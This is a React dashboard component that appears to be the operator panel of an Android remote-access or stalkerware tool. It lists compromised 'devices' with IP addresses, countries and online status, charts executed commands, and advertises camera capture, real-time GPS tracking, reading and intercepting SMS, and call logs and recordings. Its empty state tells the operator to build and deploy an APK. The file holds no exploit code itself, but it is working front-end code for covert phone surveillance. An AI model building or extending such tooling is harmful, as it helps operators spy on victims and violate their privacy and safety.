import React, { useState, useEffect } from "react";
import { Link } from "react-router-dom";
import axios from "axios";
import io from "socket.io-client";
import {
  FiSmartphone,
  FiActivity,
  FiUsers,
  FiCommand,
  FiGlobe,
  FiTrendingUp,
  FiShield,
  FiAlertTriangle,
  FiCamera,
  FiMapPin,
  FiMessageSquare,
  FiPhone,
} from "react-icons/fi";
import {
  LineChart,
  Line,
  AreaChart,
  Area,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  ResponsiveContainer,
} from "recharts";

const API = import.meta.env.VITE_API_URL || "http://localhost:5000";
const WS_URL = import.meta.env.VITE_WS_URL || "http://localhost:5000";

const statsCards = [
  {
    label: "Total Devices",
    icon: FiSmartphone,
    color: "from-blue-500 to-blue-600",
    bg: "bg-blue-500/10",
    border: "border-blue-500/20",
  },
  {
    label: "Online Now",
    icon: FiActivity,
    color: "from-green-500 to-green-600",
    bg: "bg-green-500/10",
    border: "border-green-500/20",
  },
  {
    label: "New Today",
    icon: FiUsers,
    color: "from-purple-500 to-purple-600",
    bg: "bg-purple-500/10",
    border: "border-purple-500/20",
  },
  {
    label: "Commands",
    icon: FiCommand,
    color: "from-orange-500 to-orange-600",
    bg: "bg-orange-500/10",
    border: "border-orange-500/20",
  },
];

const features = [
  {
    icon: FiCamera,
    label: "Camera Access",
    desc: "Front & back camera capture",
  },
  { icon: FiMapPin, label: "GPS Location", desc: "Real-time GPS tracking" },
  { icon: FiMessageSquare, label: "SMS Access", desc: "Read & intercept SMS" },
  { icon: FiPhone, label: "Call Logs", desc: "Call history & recordings" },
];

export default function Dashboard() {
  const [stats, setStats] = useState(null);
  const [recentDevices, setRecentDevices] = useState([]);
  const [socket, setSocket] = useState(null);
  const [connected, setConnected] = useState(false);

  useEffect(() => {
    fetchData();

    const s = io(WS_URL, {
      auth: { token: localStorage.getItem("token") },
    });

    s.on("connect", () => setConnected(true));
    s.on("disconnect", () => setConnected(false));

    s.on("device:online", () => fetchData());
    s.on("device:offline", () => fetchData());

    setSocket(s);

    return () => s.close();
  }, []);

  const fetchData = async () => {
    try {
      const token = localStorage.getItem("token");
      const devicesRes = await axios.get(`${API}/api/devices`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      setRecentDevices(devicesRes.data.slice(0, 5));
      setStats({
        total: devicesRes.data.length,
        online: devicesRes.data.filter((d) => d.status === "online").length,
      });
    } catch (err) {
      console.error("Failed to fetch data:", err);
    }
  };

  // Sample chart data
  const chartData = [
    { name: "Mon", devices: 4, commands: 12 },
    { name: "Tue", devices: 7, commands: 18 },
    { name: "Wed", devices: 5, commands: 15 },
    { name: "Thu", devices: 9, commands: 25 },
    { name: "Fri", devices: 12, commands: 30 },
    { name: "Sat", devices: 8, commands: 22 },
    { name: "Sun", devices: 6, commands: 16 },
  ];

  return (
    <div className="space-y-8">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold">Dashboard</h1>
          <p className="text-dark-400 mt-1">Monitor and control your devices</p>
        </div>
        <div className="flex items-center gap-3">
          <div
            className={`flex items-center gap-2 px-3 py-1.5 rounded-full text-sm ${
              connected
                ? "bg-green-500/10 text-green-400"
                : "bg-red-500/10 text-red-400"
            }`}
          >
            <div
              className={`w-2 h-2 rounded-full ${
                connected ? "bg-green-400 animate-pulse" : "bg-red-400"
              }`}
            />
            {connected ? "Connected" : "Disconnected"}
          </div>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        {statsCards.slice(0, 2).map((card, index) => {
          const Icon = card.icon;
          const value = stats
            ? [stats.total || 0, stats.online || 0][index]
            : "...";

          return (
            <div
              key={index}
              className={`relative overflow-hidden rounded-2xl ${card.bg} border ${card.border} p-6 card-hover`}
            >
              <div className="flex items-start justify-between">
                <div>
                  <p className="text-dark-400 text-sm font-medium">
                    {card.label}
                  </p>
                  <p className="text-3xl font-bold mt-2">{value}</p>
                </div>
                <div
                  className={`w-12 h-12 rounded-xl bg-gradient-to-br ${card.color} flex items-center justify-center shadow-lg`}
                >
                  <Icon className="text-white text-xl" />
                </div>
              </div>
              <div
                className={`absolute bottom-0 left-0 right-0 h-1 bg-gradient-to-r ${card.color} opacity-30`}
              />
            </div>
          );
        })}
      </div>

      {/* Charts */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="glass-effect rounded-2xl p-6">
          <h3 className="text-lg font-semibold mb-4">Device Activity</h3>
          <ResponsiveContainer width="100%" height={200}>
            <AreaChart data={chartData}>
              <defs>
                <linearGradient id="colorDevices" x1="0" y1="0" x2="0" y2="1">
                  <stop offset="5%" stopColor="#6366f1" stopOpacity={0.3} />
                  <stop offset="95%" stopColor="#6366f1" stopOpacity={0} />
                </linearGradient>
              </defs>
              <CartesianGrid strokeDasharray="3 3" stroke="#1e293b" />
              <XAxis dataKey="name" stroke="#64748b" />
              <YAxis stroke="#64748b" />
              <Tooltip
                contentStyle={{
                  background: "#1e293b",
                  border: "1px solid #334155",
                  borderRadius: "8px",
                }}
                labelStyle={{ color: "#94a3b8" }}
              />
              <Area
                type="monotone"
                dataKey="devices"
                stroke="#6366f1"
                fillOpacity={1}
                fill="url(#colorDevices)"
              />
            </AreaChart>
          </ResponsiveContainer>
        </div>

        <div className="glass-effect rounded-2xl p-6">
          <h3 className="text-lg font-semibold mb-4">Command Execution</h3>
          <ResponsiveContainer width="100%" height={200}>
            <LineChart data={chartData}>
              <CartesianGrid strokeDasharray="3 3" stroke="#1e293b" />
              <XAxis dataKey="name" stroke="#64748b" />
              <YAxis stroke="#64748b" />
              <Tooltip
                contentStyle={{
                  background: "#1e293b",
                  border: "1px solid #334155",
                  borderRadius: "8px",
                }}
                labelStyle={{ color: "#94a3b8" }}
              />
              <Line
                type="monotone"
                dataKey="commands"
                stroke="#8b5cf6"
                strokeWidth={2}
                dot={{ fill: "#8b5cf6" }}
              />
            </LineChart>
          </ResponsiveContainer>
        </div>
      </div>

      {/* Features & Recent Devices */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Capabilities */}
        <div className="glass-effect rounded-2xl p-6">
          <h3 className="text-lg font-semibold mb-4">Capabilities</h3>
          <div className="space-y-4">
            {features.map((feat, i) => {
              const Icon = feat.icon;
              return (
                <div
                  key={i}
                  className="flex items-center gap-3 p-3 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
                >
                  <div className="w-10 h-10 rounded-lg bg-primary-500/10 flex items-center justify-center">
                    <Icon className="text-primary-400" />
                  </div>
                  <div>
                    <p className="font-medium text-sm">{feat.label}</p>
                    <p className="text-xs text-dark-400">{feat.desc}</p>
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Recent Devices */}
        <div className="lg:col-span-2 glass-effect rounded-2xl p-6">
          <div className="flex items-center justify-between mb-4">
            <h3 className="text-lg font-semibold">Recent Devices</h3>
            <Link
              to="/devices"
              className="text-sm text-primary-400 hover:text-primary-300 transition-colors"
            >
              View All →
            </Link>
          </div>

          {recentDevices.length === 0 ? (
            <div className="text-center py-12 text-dark-400">
              <FiSmartphone className="text-4xl mx-auto mb-3 opacity-50" />
              <p>No devices connected yet</p>
              <p className="text-sm mt-1">
                Build and deploy an APK to get started
              </p>
            </div>
          ) : (
            <div className="space-y-3">
              {recentDevices.map((device) => (
                <Link
                  key={device.deviceId}
                  to={`/devices/${device.deviceId}`}
                  className="flex items-center justify-between p-4 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all card-hover"
                >
                  <div className="flex items-center gap-4">
                    <div
                      className={`w-3 h-3 rounded-full ${
                        device.status === "online"
                          ? "bg-green-400 shadow-lg shadow-green-400/30"
                          : "bg-dark-500"
                      }`}
                    />
                    <div>
                      <p className="font-medium">
                        {device.alias || device.deviceModel || "Unknown Device"}
                      </p>
                      <p className="text-xs text-dark-400">
                        {device.os} {device.osVersion} ·{" "}
                        {device.country || "Unknown"}
                      </p>
                    </div>
                  </div>
                  <div className="text-right">
                    <p className="text-sm text-dark-400">
                      {device.lastSeen
                        ? new Date(device.lastSeen).toLocaleTimeString()
                        : "Never"}
                    </p>
                    <p className="text-xs text-dark-500">{device.ip}</p>
                  </div>
                </Link>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
